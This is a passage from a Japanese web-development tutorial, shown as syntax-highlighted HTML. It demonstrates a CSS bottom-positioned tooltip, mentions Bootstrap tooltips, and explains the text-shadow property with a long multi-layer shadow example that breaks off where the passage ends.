&lt;span class="k">text-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">center&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">border-radius&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">padding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="kt">px&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c">/* Positioning the tooltip */&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">absolute&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">z-index&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">bottom&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="kt">%&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">left&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="kt">%&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">margin-left&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">-60&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">hover&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">visibility&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">visible&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="下方向のツールチップ">下方向のツールチップ&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tooltip_div&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
Bottom Tooltip
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">span&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tooltip&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>This is the Tooltip text&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">span&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">body&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">text-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">center&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">relative&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">inline-block&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">visibility&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">hidden&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">170&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">blue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#fff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">text-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">center&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">border-radius&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">padding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="kt">px&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c">/* Positioning the tooltip */&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">absolute&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">z-index&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">top&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="kt">%&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">left&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="kt">%&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">margin-left&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">-60&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">hover&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">visibility&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">visible&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Bootstrapライブラリを使用して、カスタムの &lt;a class="link" href="https://getbootstrap.com/docs/5.1/components/tooltips/" target="_blank" rel="noopener"
>Bootstrap tooltips&lt;/a> を作成することもできます。&lt;/p>
&lt;h2 id="影を追加">影を追加&lt;/h2>
&lt;p>text-shadowおよびbox-shadowCSSプロパティをそれぞれ使用して、テキストおよび要素にCSSシャドウ効果を追加できます。&lt;/p>
&lt;h3 id="文字に影を追加">文字に影を追加&lt;/h3>
&lt;p>text-shadow CSSプロパティは、テキストに影とレイヤーを追加します。 text-shadowプロパティは、テキストに適用されるシャドウのコンマ区切りリストを受け入れます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="c">/* text-shadowには4つのCSSプロパティがあります:offset-x, offset-y, blur-radius, and color */&lt;/span>
&lt;span class="c">/* offset-x | offset-y | blur-radius | color */&lt;/span>
&lt;span class="nt">text-shadow&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">2px&lt;/span> &lt;span class="nt">2px&lt;/span> &lt;span class="nt">4px&lt;/span> &lt;span class="nt">red&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="c">/* color | offset-x | offset-y | blur-radius */&lt;/span>
&lt;span class="nt">text-shadow&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">#&lt;/span>&lt;span class="nn">18fa3e&lt;/span> &lt;span class="nt">1px&lt;/span> &lt;span class="nt">2px&lt;/span> &lt;span class="nt">10px&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>color および blur-radius 引数はオプションです。&lt;/p>
&lt;p>こんなこともできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">background&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">#&lt;/span>&lt;span class="nn">e74c3c&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="nt">color&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">#&lt;/span>&lt;span class="nn">fff&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="nt">font-family&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">lato&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="nt">text-shadow&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">1px&lt;/span> &lt;span class="nt">1px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">123&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">25&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">15&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">5&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">2px&lt;/span> &lt;span class="nt">2px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">129&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">28&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">18&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">51&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">3px&lt;/span> &lt;span class="nt">3px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">135&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">31&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">20&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">52&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">4px&lt;/span> &lt;span class="nt">4px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">140&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">33&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">22&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">53&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">5px&lt;/span> &lt;span class="nt">5px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">145&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">36&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">24&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">54&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">6px&lt;/span> &lt;span class="nt">6px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">150&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">38&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">26&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">55&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">7px&lt;/span> &lt;span class="nt">7px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">154&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">40&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">28&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">56&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">8px&lt;/span> &lt;span class="nt">8px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">158&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">42&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">30&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">57&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">9px&lt;/span> &lt;span class="nt">9px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">162&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">44&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">31&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">58&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">10px&lt;/span> &lt;span class="nt">10px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">166&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">45&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">33&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">59&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">11px&lt;/span> &lt;span class="nt">11px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">169&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">47&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">34&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">6&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">12px&lt;/span> &lt;span class="nt">12px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">173&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">48&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">36&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">61&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">13px&lt;/span> &lt;span class="nt">13px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">176&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">50&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">37&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">62&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">14px&lt;/span> &lt;span class="nt">14px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">178&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">51&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">38&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">63&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">15px&lt;/span> &lt;span class="nt">15px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">181&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">52&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">39&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">64&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">16px&lt;/span> &lt;span class="nt">16px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">184&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">54&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">40&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">65&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">17px&lt;/span> &lt;span class="nt">17px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">186&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">55&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">41&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">66&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">18px&lt;/span> &lt;span class="nt">18px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">189&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">56&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">42&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">67&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">19px&lt;/span> &lt;span class="nt">19px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">191&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">57&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">43&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">68&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">20px&lt;/span> &lt;span class="nt">20px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">193&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">58&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">44&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">69&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">21px&lt;/span> &lt;span class="nt">21px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">195&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">59&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">45&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">7&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">22px&lt;/span> &lt;span class="nt">22px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">197&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">60&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">46&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">71&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">23px&lt;/span> &lt;span class="nt">23px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">199&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">61&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">47&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">72&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">24px&lt;/span> &lt;span class="nt">24px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">201&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">62&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">47&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">73&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">25px&lt;/span> &lt;span class="nt">25px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">202&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">62&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">48&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">74&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">26px&lt;/span> &lt;span class="nt">26px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">204&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">63&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">49&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">75&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">27px&lt;/span> &lt;span class="nt">27px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">206&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">64&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">49&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">76&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">28px&lt;/span> &lt;span class="nt">28px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">207&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">65&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">50&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">77&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">29px&lt;/span> &lt;span class="nt">29px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">209&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">65&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">51&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">78&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">30px&lt;/span> &lt;span class="nt">30px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">210&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">66&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">51&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">79&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">31px&lt;/span> &lt;span class="nt">31px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">211&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">67&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">52&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">8&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">32px&lt;/span> &lt;span class="nt">32px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">213&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">67&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">52&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">81&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">33px&lt;/span> &lt;span class="nt">33px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">214&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">68&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">53&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">82&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">34px&lt;/span> &lt;span class="nt">34px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">215&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">69&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">53&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">83&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">35px&lt;/span> &lt;span class="nt">35px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">216&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">69&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">54&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">84&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">36px&lt;/span> &lt;span class="nt">36px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">218&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">70&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">54&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">85&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">37px&lt;/span> &lt;span class="nt">37px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">219&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">70&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">55&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">86&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">38px&lt;/span> &lt;span class="nt">38px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">220&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">71&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">55&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">87&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">39px&lt;/span> &lt;span class="nt">39px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">221&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">71&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">56&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">88&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">40px&lt;/span> &lt;span class="nt">40px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">222&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">72&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">56&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">89&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">41px&lt;/span> &lt;span class="nt">41px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">223&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">72&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">57&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">9&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">42px&lt;/span> &lt;span class="nt">42px&lt;/span> &lt;span class="nt">rgba&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">224&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">73&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">57&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nt">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">91&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="nt">43px&lt;/span> 